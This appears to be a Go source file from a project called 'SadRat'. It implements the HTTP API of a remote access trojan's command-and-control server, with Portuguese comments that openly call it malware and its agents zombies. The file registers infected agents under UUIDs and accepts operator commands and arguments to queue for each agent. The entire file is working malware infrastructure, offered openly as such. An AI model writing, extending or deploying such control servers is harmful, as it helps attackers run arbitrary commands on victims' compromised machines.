package presentation

import (
	"encoding/json"
	"net/http"

	"github.com/VitorDie/SadRat/internal/domain"
	"github.com/google/uuid"
)

// DTOs (Data Transfer Objects) - O formato exato que trafega na rede
type CreateJobRequest struct {
	AgentID string   `json:"agent_id"`
	Command string   `json:"command"`
	Args    []string `json:"args"`
}

// Repository exige os métodos que o Servidor precisa para funcionar
type Repository interface {
	SaveAgent(agent domain.AgentRow) error
	SaveJob(job domain.JobRow) error // Adicionamos a exigência de salvar o comando
}

// ServerHTTP é a nossa API C&C
type ServerHTTP struct {
	repo Repository
}

// NewServerHTTP constrói a API injetando o banco de dados
func NewServerHTTP(repo Repository) *ServerHTTP {
	return &ServerHTTP{repo: repo}
}

// Router configura todas as rotas do malware
func (s *ServerHTTP) Router() http.Handler {
	mux := http.NewServeMux()

	// Roteamento REST nativo do Go
	mux.HandleFunc("POST /api/agents", s.handleGiveAnUUIDForAgentRequest)
	mux.HandleFunc("POST /api/jobs", s.handleReceiveCommand) // Nova rota do Operador

	return mux
}

// handleGiveAnUUIDForAgentRequest registra um novo zumbi
func (s *ServerHTTP) handleGiveAnUUIDForAgentRequest(w http.ResponseWriter, r *http.Request) {
	newUUID := uuid.NewString()
	agentRow := domain.NewAgentRow(newUUID)

	if err := s.repo.SaveAgent(agentRow); err != nil {
		http.Error(w, "Erro ao registrar agente", http.StatusInternalServerError)
		return
	}

	response := map[string]string{"uuid": newUUID}
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(response)
}

// handleReceiveCommand recebe o comando do Operador e agenda para o Agente
func (s *ServerHTTP) handleReceiveCommand(w http.ResponseWriter, r *http.Request) {
	// 1. Decodificação do DTO (Decoding requests)
	var req CreateJobRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "JSON inválido", http.StatusBadRequest)
		return
	}

	// 2. Transformação do DTO na Entidade/Linha de Banco de Dados
	jobRow := domain.NewJobRow(req.AgentID, req.Command, req.Args)

	// 3. Chamada ao Cofre (Service/Repository Layer)
	if err := s.repo.SaveJob(jobRow); err != nil {
		http.Error(w, "Erro ao salvar comando", http.StatusInternalServerError)
		return
	}

	// 4. Codificação da Resposta (Encoding responses) com o ID gerado
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(http.StatusCreated)
	json.NewEncoder(w).Encode(map[string]interface{}{
		"id":       jobRow.ID,
		"agent_id": jobRow.AgentID,
		"command":  jobRow.Command,
		"args":     jobRow.Args,
	})
}
